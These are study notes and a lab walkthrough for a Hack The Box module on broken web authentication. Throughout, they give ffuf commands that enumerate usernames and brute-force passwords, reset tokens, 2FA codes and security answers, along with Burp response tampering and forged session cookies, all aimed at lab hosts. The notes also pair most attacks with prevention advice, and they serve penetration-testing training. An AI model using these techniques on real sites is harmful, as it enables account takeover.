# HTB: Broken Authentication Module Summary

Module Link: https://academy.hackthebox.com/app/module/80

## **Introduction to Authentication**

### **Introduction to Authentication**

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h1.png)

**Common Authentication Methods**

Information technology systems can implement different authenticationmethods. Typically, they can be divided into the following three major categories:

- Knowledge-based authentication
- Ownership-based authentication
- Inherence-based authentication

| Knowledge | Ownership | Inherence |
| --- | --- | --- |
| Password | ID card | Fingerprint |
| PIN | Security Token | Facial Pattern |
| Answer to Security Question | Authenticator App | Voice Recognition |

**Single-Factor Authentication vs Multi-Factor Authentication**

- Single-factor authentication relies solely on a single method of authentication.
- On the other hand, `multi-factor authentication (MFA)` involves multiple authentication methods. For instance, if a web application requires a password and a time-based one-time password (TOTP), it relies on knowledge of the password and ownership of the TOTP device for authentication. MFA is commonly referred to as `two-factor authentication (2FA)`.

### **Attacks on Authentication**

Authentication security is a constant arms race. Here is a summary of the common attacks and vulnerabilities categorized by the three primary authentication factors:

---

**1. Knowledge-based Authentication (Something You Know)**

This is the most common but also the most vulnerable method because it relies on static information.

- **Vulnerabilities:** Susceptible to **guessing**, **brute-forcing**, and **credential stuffing** (using leaked data from other breaches).
- **Attack Vectors:** Attackers often use **social engineering** (phishing) to trick users into revealing secrets or exploit data breaches to acquire stored passwords.
- **The Problem:** Once a password or "security question" is known, the account is fully compromised until the user changes it.

---

**2. Ownership-based Authentication (Something You Have)**

This relies on physical items like smart cards, hardware tokens (YubiKeys), or mobile devices.

- **Vulnerabilities:** The primary threats are **physical theft** or **cloning**. For example, NFC badges can be skimmed in public places.
- **Strengths:** Highly resistant to remote attacks like phishing or password guessing because the attacker needs the physical "key."
- **The Problem:** High cost of deployment and logistical headaches if a user loses their physical token.

---

**3. Inherence-based Authentication (Something You Are)**

This uses biometrics, such as fingerprints, facial recognition, or iris scans.

- **Vulnerabilities:** The biggest risk is a **data breach**. If a biometric database is hacked, the compromise is **permanent and irreversible** because a user cannot "change" their fingerprint or retina.
- **Strengths:** Offers the best user experience and eliminates the need to remember passwords or carry hardware.
- **The Problem:** In addition to privacy concerns, these systems can suffer from algorithmic bias or "spoofing" (using high-res photos or 3D molds to trick sensors).

---

**Summary Comparison Table**

| Method | Key Vulnerability | Portability/Convenience | Risk Level |
| --- | --- | --- | --- |
| **Knowledge** | Social Engineering / Brute Force | High | High |
| **Ownership** | Physical Theft / Cloning | Medium | Low (Remote) |
| **Inherence** | Permanent Data Breach | Very High | Critical (if breached) |

## **Brute-Force Attacks**

### Enumerating Usernames

User enumeration vulnerabilities occur when a web application responds differently to registered and valid versus invalid inputs for authentication endpoints. User enumeration vulnerabilities often occur in functions that rely on the user's username, such as user login, registration, and password reset.

Example: A website that responds with `Unknown username` for an invalid username, such as `abc`, we can see the following error message:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_1.png)

As for valid usernames, we got this error message, such as `htb-stdnt` and an invalid password, we can see a different error:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_2.png)

using these error messages to enumerate valid usernames using `fffuf` tool. wordlist used → [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Usernames)

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt  \
  -u "http://94.237.122.95:31568/index.php" \
 -X POST \
 -d "username=FUZZ&password=test" \
 -fr "Unknown user" \
 -H "Content-Type: application/x-www-form-urlencoded"
```

result

```bash
cookster                [Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 709ms]
bettyboo                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 706ms]
bobtom                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2088ms]
manahil                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1931ms]
masterlo                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4966ms]
matrixxx                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3721ms]
mark34  
```

---

**User Enumeration via Side-Channel Attacks:** While differences in the web application's responses are the simplest and most obvious way to enumerate valid usernames, we can also do so via side channels. Side-channel attacks do not directly target the web application's response, but rather extra information that can be obtained or inferred from it. An example of a side channel is the response timing, i.e., the time it takes for the web application's response to reach us. 

### **Brute-Forcing Passwords**

When accessing the sample web application, we can see the following information on the login page:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_3.png)

The success of a brute-force attack depends entirely on the number of attempts an attacker can perform and the time it takes to complete the attack. As such, ensuring that a good wordlist is used for the attack is crucial. If a web application enforces a password policy, we should  that our wordlist only contains passwords that match the implemented password policy. Otherwise, we are wasting valuable time with passwords that users cannot use on the web application, as the password policy does not allow them.

```bash
awk 'length$(0) >=10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /usr/share/wordlists/rockyou.txt > mini-rockyou.txt
```

or we can use grep 

```bash
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

result:

```bash
$ wc -l mini-rockyou.txt                                                                    
435475 mini-rockyou.txt
                                                                                                     
$ wc -l /usr/share/wordlists/rockyou.txt
14344392 /usr/share/wordlists/rockyou.txt

$ head mini-rockyou.txt 
Password1
Princess1
P@ssw0rd
Passw0rd
Jesus1
Michael1
Blink182
Angel1
!QAZ2wsx
Charlie1
```

First we need to know the login format, we can obtain this from the network tab: 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_4.png)

```bash
username=admin&password=test
```

Using the custom rockyou wordlist and the error message and the POST form to craft the attack: 

```bash
ffuf -w mini-rockyou.txt  \                                                         
  -u "http://83.136.255.53:44978/index.php" \
 -X POST \
 -d "username=admin&password=FUZZ" \
 -fr "Invalid username or password" \
 -H "Content-Type: application/x-www-form-urlencoded"
```

I got multiple passwords on the admin account but one of them is currect

```bash
Harriet22               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1204ms]
newPORTBEACH29          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 841ms]
Spongebo1               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1077ms]
Ramirez120992           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 119ms]
1qazZAQ1 
```

- For more details on creating custom wordlists and attacking password-based authentication, check out the [Cracking Passwords with Hashcat](https://academy.hackthebox.com/module/details/20) and [Password Attacks](https://academy.hackthebox.com/module/details/147) modules. Further details on brute-forcing different variations of web application logins are provided in the [Login Brute Forcing](https://academy.hackthebox.com/module/details/57) module.

### **Brute-Forcing Password Reset Tokens**

Many web applications implement a password recovery functionality in case a user forgets their password. This password-recovery functionality typically relies on a **one-time reset token,** which is transmitted to the user, for instance, via SMS or email. The user can then authenticate using this token, enabling them to reset their password and access their account.

As such, a weak password-reset token may be brute-forced or predicted by an attacker to gain unauthorized access to a victim's account.

**Identifying Weak Reset Tokens:** Reset tokens (in the form of a code or temporary password) are secret data generated by an application when a user requests a password reset. The user can then change their password by presenting the reset token.

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_5.png)

To identify weak reset tokens, we typically need to create an account on the target web application, request a password reset token, and then analyze it to determine its strength. In this example, let us assume we have received the following password reset email:

```
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this email.

Thank you.

```

As we can see, the password reset link contains the reset token in the GET parameter `token`. In this example, the token is `7351`. Given that the token consists of only a 4-digit number, there can be only `10,000` possible values. This allows us to hijack users' accounts by requesting a password reset and then brute-forcing the token.

- 10^4= `10,000`
- 10^6=`1,000,000`

```bash
Number of digits: 6
Possible values per digit: 10 (0, 1, 2, 3, 4, 5, 6, 7, 8, 9)
```

The time it takes to go through all **1,000,000** possibilities for a 6-digit OTP depends entirely on the **scenario** (where the attack is happening) and the **defenses** in place

| **Scenario** | **Attempts per Second** | **Time to Exhaust All Combinations** |
| --- | --- | --- |
| **Offline (Local PC)** | $10,000,000$ | **$0.1$ seconds** |
| **Online (No Security)** | $100$ | **$2.8$ hours** |
| **Online (Throttled)** | $0.5$ | **$23$ days** |

---

**Attacking Weak Reset Tokens:** in the password reset function, enter the username that we want to change the password

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_6.png)

The token will be sent to the admin email containing a GET parameter `token` in the `/reset_password.php`

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_7.png)

and if the token is valid, the request is accepted; otherwise, we will get this error: 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_8.png)

We will use `ffuf` to brute-force all possible reset tokens. First, we need to create a wordlist of all possible tokens from `0000` to `9999`, which we can achieve with `seq`: The `-w` flag pads all numbers to the same length by prepending zeroes (like `7` → `0007`)

```bash
seq -w 0 9999 > tokens.txt
```

Assuming that there are users currently in the process of resetting their passwords, we can try to brute-force all active reset tokens. If we want to target a specific user, we should first send a password reset request for that user to create a reset token. We can then specify the wordlist in `ffuf` to brute-force all active reset-tokens:

```bash
ffuf -w tokens.txt \
-u "http://94.237.55.124:41229/reset_password.php?token=FUZZ" \ 
> -fr "The provided token is invalid" \
> -H "Content-Type: application/x-www-form-urlencoded"
```

```bash
3106      
4457
```

Using the valid token found to reset the password of the admin username: 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_9.png)

By specifying the reset token in the GET parameter `token` in the `/reset_password.php` endpoint, we can reset the password of the corresponding account, enabling us to take over the account.

### **Brute-Forcing 2FA Codes**

This section demonstrates how a weak implementation of Two-Factor Authentication (2FA) can be bypassed using brute-force techniques. Even with a valid password, an account remains vulnerable if the second layer of security is poorly designed.

---

**The Core Vulnerability: 4-Digit TOTPs:** The example highlights a critical security flaw: a **4-digit Time-based One-Time Password (TOTP)**.

- **Mathematical Weakness:** A 4-digit code only allows for **10,000** possible combinations (0000 to 9999).
- **The Exploit:** Because the number of possibilities is so low, an attacker can test every single combination (exhaustion attack) in a matter of minutes.
- **Prerequisites:** This attack succeeds if the web application fails to implement **rate limiting** (blocking the user after too many failed attempts) or **account lockout** mechanisms.

**Attacking Two-Factor Authentication (2FA):** Assuming we have obtained valid credentials via phishing `admin:admin` However, the web application is secured with 2FA, as we can see after logging in with the obtained credentials: 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_10.png)

The message in the web application shows that the TOTP is a 4-digit code. Since there are only `10,000`possible variations, we can easily try all possible codes. To achieve this, let us first take a look at the corresponding request to prepare our parameters for `ffuf`:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_11.png)

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_12.png)

Don't forget to add the session cookie header to instruct the tool to the correct target

```bash
ffuf -w tokens.txt \
-u "http://83.136.253.144:49612/2fa.php" \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Cookie: PHPSESSID=rr7t81eef6vb2jmob3riqjde1s" \
-X POST \
-d "otp=FUZZ" \
-fr "Invalid 2FA Code" 

```

result:

```bash
4734                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 407ms]
4733                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 413ms]
4726                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 415ms]
4728                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 413ms]
4723                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 416ms]
4731                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 413ms]
4725                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 413ms]
4729                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 414ms]
.....
```

**Success Indicator:** A successful guess usually results in a different HTTP status code (like a **302 Redirect**) or a change in response size, indicating the session is now fully authenticated. All requests using our session cookie are redirected to `/admin.php`.

---

### **Weak Brute-Force Protection**

- **Rate Limiting** functions by restricting the number of incoming requests within a set timeframe to maintain system stability and block automated attacks.
- **Identification Weaknesses** occur when rate limits rely on IP addresses. In environments using load balancers or proxies, systems often use the **X-Forwarded-For** header to find the "real" IP.
- **Header Spoofing** allows attackers to bypass these limits by randomizing the **X-Forwarded-For** value in each request, tricking the server into thinking every attempt comes from a unique user. reported in [CVE-2020-35590.](https://nvd.nist.gov/vuln/detail/CVE-2020-35590)
- **CAPTCHAs** are designed to distinguish humans from bots by presenting challenges that are easy for people but difficult for software, effectively making brute-force a manual, slow task.
    
 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h2_13.png)
    
- **Implementation Flaws** can render CAPTCHAs useless, such as when the solution is accidentally included in the HTTP response or when the logic is easily predictable.
- **Technological Bypasses** are becoming more common as AI and machine learning tools improve at solving image and voice recognition challenges automatically.
- **Usability Concerns** remain a significant drawback, as these security measures can often create barriers for users with visual or cognitive impairments.

---

## **Password Attacks**

### Default Credentials

Many web applications are set up with default credentials to allow access after installation. However, these credentials need to be changed after the initial setup of the web application; otherwise, they provide an easy way for attackers to obtain authenticated access. As such, [Testing for Default Credentials](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials) is an essential part of authentication testing in OWASP's Web Application Security Testing Guide. According to OWASP, common default credentials include `admin` and `password`.

**Testing Default Credentials:** 

- [CIRT.net](https://www.cirt.net/passwords). → contains a database of default passwords for variety of web applications.
- [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) wordlist
- [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) GitHub repository

Example: Lets assume we have this website https://demo.bookstackapp.com/login 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h3_1.png)

if we try to search for `bookstack default credentials` in google search, we will find the [installation page ](https://www.bookstackapp.com/docs/admin/installation/)of the BookStack website that contain instruction of the default credentials

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h3_2.png)

### **Vulnerable Password Reset**

We have already discussed how to brute-force password reset tokens to gain access to a victim's account. However, even if a web application utilizes rate limiting and CAPTCHAs, business logic bugs within the password reset functionality can still allow for the takeover of other users' accounts.

---

**Guessable Password Reset Questions:** Often, web applications authenticate users who have lost their passwords by requiring them to answer one or more security questions. It is common to find questions like the following:

- "`What is your mother's maiden name?`"
- "`What city were you born in?`"

While these questions seem tied to the individual user, they can often be obtained through `OSINT` or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection.

For the question: `What city were you born in?` in the Password Reset page of the admin account

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h3_3.png)

We can brute force it using this [CSV](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) file, while contains a list of cities name. 

```bash
$ head world-cities.csv 
name,country,subcountry,geonameid
les Escaldes,Andorra,Escaldes-Engordany,3040051
Andorra la Vella,Andorra,Andorra la Vella,3041563
Warīsān,United Arab Emirates,Dubai,290503
```

We could narrow down the cities if we had additional information on our target to reduce the time required for our brute-force attack on the security question. For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:

```bash
$ cat world-cities.csv| grep "Germany" | cut -d ',' -f1 > city_wordlist.txt 
                                                                                 $ head city_wordlist.txt                                                    
Zwickau
Zweibrücken
Zülpich
...
```

But in our example, we will use all the cities’ names.

```bash
cat world-cities.csv| cut -d ',' -f1 > cities.txt 
```

Example: 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h3_4.png)

Brute Forcing the security question:

```bash
$ ffuf -w cities.txt \                             
-u "http://94.237.61.52:38160/security_question.php" \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-b "PHPSESSID=00mpnr54p5nmlbuhfno62fbaoj" \
-d "security_response=FUZZ" \               
-fr "Incorrect response."

 
________________________________________________

Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1050ms]
```

we found the correct answer and we got redirected to the reset page

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h3_5.png)

Now we can reset the password of the admin user

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h3_6.png)

---

**Manipulating the Reset Request:** Another instance of a flawed password reset logic occurs when a user can manipulate a potentially hidden parameter to reset the password of a different account. 

For instance; in the example above, we successfully guessed the city name of the admin account; therefore, we were forwarded to the password reset page. 

```bash
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=00mpnr54p5nmlbuhfno62fbaoj

password=test&username=admin
```

Suppose the web application does not properly verify that the usernames in both requests match. In that case, we can skip the security question or supply the answer to our security question and then set the password of an entirely different account. For instance, we can change the `htb-stdnt` user's password by manipulating the `username` parameter of the password reset request:

```bash
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=00mpnr54p5nmlbuhfno62fbaoj

password=test&username=htb-stdnt
```

To prevent this vulnerability, keeping a consistent state during the entire password reset process is essential. Resetting an account's password is a sensitive process where minor implementation flaws or logic bugs can enable an attacker to take over other users' accounts. As such, we should investigate the password reset functionality of any web application closely and keep an eye out for potential security issues.

## **Authentication Bypasses**

### **Authentication Bypass via Direct Access**

**Direct Access:** The most straightforward way of bypassing authentication checks is to request the protected resource directly from an unauthenticated context. An unauthenticated attacker can access protected information if the web application does not properly verify that the request is 
authenticated.

For instance, If we have a web application that redirects users to `admin.php` page after successful authentication. If the web application relies solely on the login page to authenticate 
users, we can access the protected resource directly by accessing the `/admin.php` endpoint.

Example: Here, if we attempt to access the `admin.php` page in our web browser, the browser follows the redirect and displays the login prompt instead of the protected admin page.

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h4_1.png)

We can easily trick the browser into displaying the admin page by intercepting the response and changing the status code from `302` to `200`. 

To do this, enable `Intercept` in Burp. Afterward, browse to the `/admin.php` endpoint in the web browser. Next, right-click on the request and select `Do intercept > Response to this request` to intercept the response:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h4_2.png)

Click forward and the brup will intercept the response 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h4_3.png)

On the intercepted response, change the response code from  302 Found to 200 and click forward.

- Also note the redirect response returned the protected information in the response body

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h4_4.png)

Once forwarded, you will have access to the admin page from your browser without authentication!

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h4_5.png)

This vulnerability occurred because the web application uses the following snippet of PHP code to verify whether a user is authenticated:

```php
if(!$_SESSION['active']) {
	header("Location: index.php");
}
```

This code redirects the user to `/index.php` if the session is not active, i.e., if the user is not authenticated. However, the PHP script does not stop execution, resulting in protected 
information within the page being sent in the response body:

To prevent the protected information from being returned in the body of the redirect response, the PHP script needs to exit after issuing the redirect:

```php
if(!$_SESSION['active']) {
	header("Location: index.php");
	exit;
}
```

### **Authentication Bypass via Parameter Modification**

An authentication implementation can be flawed if it depends on the presence or value of an HTTP parameter, introducing authentication vulnerabilities. This type of vulnerability is closely related to authorization issues such as `Insecure Direct Object Reference (IDOR)` vulnerabilities, which are covered in more detail in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

**Privilege Escalation via Parameter Modification:** we were provided with valid credentials but we have limited privileges 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h4_6.png)

To investigate the purpose of the `user_id` parameter, let us remove it from our request to `/admin.php`. When doing so, we are redirected back to the login screen at `/index.php`, even though our session provided in the `PHPSESSID` cookie is still valid:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h4_7.png)

Thus, we can assume that the parameter `user_id` is related to authentication. We can bypass authentication entirely by accessing the URL `/admin.php?user_id=183` directly:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h4_8.png)

Based on the parameter name `user_id`, we can infer that the parameter specifies the ID of the user accessing the page.

```bash
$ ffuf -u "http://94.237.122.188:44869/admin.php?user_id=FUZZ"  \
 -w numbers.txt \
-H "Cookie: PHPSESSID=hj64aqaqj41d4j7g16dbvgautd" \
-fr "Could not load admin data"                               

372                     [Status: 200, Size: 14465, Words: 4165, Lines: 429, Duration: 993ms]
:: Progress: [1000/1000] :: Job [1/1] :: 66 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
                                                    
```

**Final Remark**

Note that many more advanced vulnerabilities can also lead to an authentication bypass, which we have not covered in this module but are covered by more advanced modules. For instance, type juggling leading to an authentication bypass is covered in the [Whitebox Attacks](https://academy.hackthebox.com/module/details/205) module, how different injection vulnerabilities can lead to an authentication bypass is covered in the [Injection Attacks](https://academy.hackthebox.com/module/details/204) and [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33) modules, and logic bugs that can lead to an authentication bypass are covered in the [Parameter Logic Bugs ](https://academy.hackthebox.com/module/details/239)module.

## **Session Attacks**

### **Attacking Session Tokens**

Session tokens are unique identifiers that a web application uses to identify a user. More specifically, the session token is tied to the user's session. If an attacker can obtain a valid session token of another user, they can impersonate the user to the web application, thereby taking over their session.

---

**Brute-Force Attack:** Suppose a session token does not provide sufficient randomness and is cryptographically weak.**n that case, we can brute-force valid session tokens.** This can occur if a session token is too short or contains static data that does not provide randomness to the token, i.e., the token provides [insufficient entropy.](https://owasp.org/www-community/vulnerabilities/Insufficient_Entropy)

For instance; if  the session token  provides sufficient length; however, the token consists of hardcoded prepended and appended values, while only a small part of the session token is dynamic to provide randomness.

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h5_1.png)

After sending multiple requests you will notice that most of the session token are the same and a small number are generated randomly

```bash
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
```

Since 28 out of 32 characters are static, **there are only four characters we need to enumerate to brute-force all existing active sessions**, enabling us to hijack all active sessions.

Another vulnerable example would be an incrementing session identifier. For instance, consider the following capture of successive session tokens:

```
141233
141234
141237
141238
141240
```

As we can see, the session tokens seem to be incrementing numbers. This makes enumeration of all past and future sessions trivial,as we simply need to increment or decrement our session token to obtain active sessions and hijack other users' accounts.

---

**Attacking Predictable Session Tokens:** In a more realistic scenario, the session token does provide sufficient randomness on the surface. However, the generation of session tokens is not truly random; it can be predicted by an attacker with insight into the session token generation logic.

The simplest form of predictable session tokens contains encoded data we can tamper with. For instance, consider the following session token:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h5_2.png)

While this session token might seem random at first, a simple analysis reveals that it is base64-encoded data:

```bash
$ echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user

```

As we can see, the cookie contains information about the user and the role tied to the session. However, there is no security measure in place that prevents us from tampering with the data. We can forge our own session token by manipulating the data and base64-encoding it to match the expected format, enabling us to forge an admin cookie:

```bash
$ echo -n 'user=htb-stdnt;role=admin' | base64

dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
```

The same thing apply to hex encoding in this example:

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h5_3.png)

```bash
$ echo "757365723d6874622d7374646e743b726f6c653d75736572" | xxd -r -p
user=htb-stdnt;role=user   
```

After login, the website give us a user role as shown in the session token

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h5_4.png)

Now if we can change the user role to admin, then hex encode it and paste it into the session token

```bash
$ echo "user=htb-stdnt;role=admin" | xxd -p  
757365723d6874622d7374646e743b726f6c653d61646d696e0a
```

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/h5_5.png)

We will successfully gain administrator privileges! 

### **Further Session Attacks**

This section covers two critical vulnerabilities related to how web applications manage the lifecycle of a session token.

---

**Session Fixation:** Session Fixation occurs when an application fails to issue a **new** session ID after a user logs in, allowing an attacker to "fix" a known ID onto a victim.

- **The Mechanism:** The attacker generates a valid session ID (e.g., by visiting the site) and tricks a victim into using it—often via a URL parameter like `?sid=123`.
- **The Exploit:** If the victim logs in while using that specific ID, the server associates the victim's account with the attacker’s known token.
- **The Result:** The attacker now has an "open door" to the victim's account because they already possess the active token.
- **Prevention:** Applications must **regenerate** the session ID immediately upon successful authentication.
- Note Session Fixation is not the same as the session hijacking → for more info visit https://owasp.org/www-community/attacks/Session_fixation

---

**Improper Session Timeout:** A session token should be a temporary "key." If it doesn't expire, the risk of abuse increases significantly.

- **The Issue:** Without a defined timeout, a hijacked session remains valid forever. This gives an attacker unlimited time to exploit a stolen cookie.
- **Contextual Security:** There is no "one size fits all" for timeouts.
    - **High Sensitivity:** (e.g., Banking/Health) should expire in minutes.
    - **Low Sensitivity:** (e.g., Social Media) might stay active for hours or days.
- **Prevention:** Servers must invalidate tokens after a period of inactivity (idle timeout) or a maximum total lifespan (absolute timeout).

---

- More advanced session attacks, such as Session Puzzling, are covered in the [Abusing HTTP Misconfigurations](https://academy.hackthebox.com/module/details/189) module.

## Skills Assessment

### Scenario

The tech company `SecureMint Innovations` has tasked you to perform a security assessment of their web application after deploying an entirely new authentication concept, including an updated 
password policy designed to strengthen overall account security. The client wants assurance that no hidden weaknesses could still put user accounts at risk. Your task is to focus specifically on identifying vulnerabilities within the authentication process. Try to utilize the various techniques you learned in this module to identify and exploit vulnerabilities found in the web application.

---

### Discovery

In the Registration page, the website defined these policy for the password:  

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s1.png)

- **Lower-case (a-z):** 26 characters
- **Upper-case (A-Z):** 26 characters
- **Digits (0-9):** 10 characters
- **Total Pool (L):** 26+26+10=62 characters

If the only rule was "12 characters long using the 62-character pool," the total number of possibilities would be:

```bash
6212=3,226,266,762,318,850,654,208
```

I registered a Test username with this password: `Password1234`

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s2.png)

Note we don’t have admin privilege obviously 

### Testing Enumerating users based on the error message

After registration, i went back on the login page and I login with invalid password for my account and I got this error message

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s3.png)

This opens the door for username enumeration since there is a different error message for valid username and invalid one (`Unknown username or password`.). **Using ffuf to enumerate valid usernames:** 

```bash
ffuf -u "http://83.136.249.34:45788/login.php" \
-w /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=FUZZ&password=test" \
-fr "Unknown username or password."
```

result:

```bash
gladys
```

### Password Brute-force based on Custom Wordlist

based on the defined password policy, we will grep the passwords that matches the policy from `rockyou.txt` file

```bash
awk 'length($0) == 12 && /[0-9]/ && /[a-z]/ && /[A-Z]/ && !/[^a-zA-Z0-9]/' /usr/share/wordlists/rockyou.txt > mini-rockyou.txt
```

- `length($0) == 12`: Checks the length.
- `/[0-9]/ && /[a-z]/ && /[A-Z]/`: Checks for the three required types.
- `!/[^a-zA-Z0-9]/`: The `!` means "NOT." This part says "Does NOT contain anything that isn't a letter or a number."

**Start password fuzzing:** 

```bash
$ ffuf -u "http://94.237.49.88:48183/login.php" \
-w mini-rockyou.txt \                                                         
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=gladys&password=FUZZ" \
-fr "Invalid credentials" 
```

result:

```bash
dWinaldasD13
```

However, even with the valid credentials we sill have to sumbit the One-time-Password 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s4.png)

### **Testing Two-Factor Authentication (2FA) Brute-Force**

Here I tested for OTP brute force with different number range

- 10^4 = 10000
- 10^5 = 100000
- 10^6= 1000000

```bash
$ ffuf -u "http://94.237.49.88:48183/2fa.php" \
-w tokens.txt \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "otp=FUZZ" \
-fr "Invalid" \
-b "PHPSESSID=41m35t3326qpj39l350frcmdst"
```

But no response returned

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s5.png)

### Testing for Authentication bypass via Direct access

Fist I tried to bypass the authentication by directly accessing the `profile.php` page then intercepting the response 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s6.png)

and modify it from 302 to 200 

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s7.png)

click forward you will login

 ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s8.png)

but i still don’t have admin privileges 

Again: This time I login with the valid credentials I obtained from fuzzing then tried to bypass the 2fa authentication via direct access 

1. First, I submit the credentials and intercepted the request, then clicked on the request and select `Do intercept > Response to this request` to intercept the response
    
     ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s9.png)

    
2. Once intercepted, I modified the response instead of forwarding the request to the `2fa.php` page I change it to forward it to  `profile.php` page of `gladys` account
    
     ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s10.png)

    
3. click forward or send the GET request of the `profile.php` page to Repeater to see the magic!
    
     ![ALT](/HTB/Web_Penetration_Tester/Broken_Authentication/Images/s11.png)

    

## Verbose Error Messages (Username Enumeration)

You discovered that the application returns different error messages for a valid username vs. an invalid one. This allows an attacker to confirm if a user (like "gladys") exists before even attempting a password attack.

- **Vulnerability:** Information Leakage via Authentication Responses.
- **Protection:** Implement **Generic Error Messages**. Regardless of whether the username or password is incorrect, the server should return a single, ambiguous message: *"Invalid username or password."*

---

## 2. Inadequate 2FA Implementation (Bypass via Redirection)

